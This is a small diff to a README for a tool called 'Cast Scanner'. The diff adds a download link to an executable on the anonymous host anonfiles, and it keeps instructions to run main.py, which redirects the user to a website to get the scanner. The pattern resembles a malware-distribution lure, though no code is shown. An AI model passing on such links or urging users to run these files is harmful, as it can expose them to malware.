@@ -1,4 +1,5 @@
-# Update 1.2 https://anonfiles.com/v6v0i9Rdxc/Cast_Scanner_exe
+# DOWNLOAD https://anonfiles.com/v6v0i9Rdxc/Cast_Scanner_exe
+# Update 1.2
 I managed to compress the whole scanner into a single file, the proble with this is that now you must run the main.py and it'll bring you to a website where you can get the scanner. I am sorry for this trouble. Hopefully I can get it in msi compressed form!
 
 # What is cast?
